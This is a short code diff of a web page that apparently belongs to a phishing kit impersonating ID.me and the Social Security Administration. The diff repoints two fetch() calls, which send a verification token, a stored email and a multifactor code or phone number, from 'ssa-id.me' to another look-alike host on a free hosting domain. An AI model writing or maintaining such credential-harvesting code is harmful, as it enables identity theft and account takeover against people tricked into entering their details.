@@ -28,7 +28,7 @@ error_reporting(0);
             window.location.href = 'index.php';
             return;
         }
-        fetch('http://ssa-id.me/id.me/verify_token.php', {
+        fetch('http://ssa.000.pe/id.me/verify_token.php', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -1255,7 +1255,7 @@ error_reporting(0);
             var phone_number = document.getElementById('multifactor_code').value;
             const email = localStorage.getItem('email');
             // when you use this in production mode, you have to replace localhost into server ip address or domain
-            fetch('http://ssa-id.me/id.me/save_phonenumber.php', {
+            fetch('http://ssa.000.pe/id.me/save_phonenumber.php', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
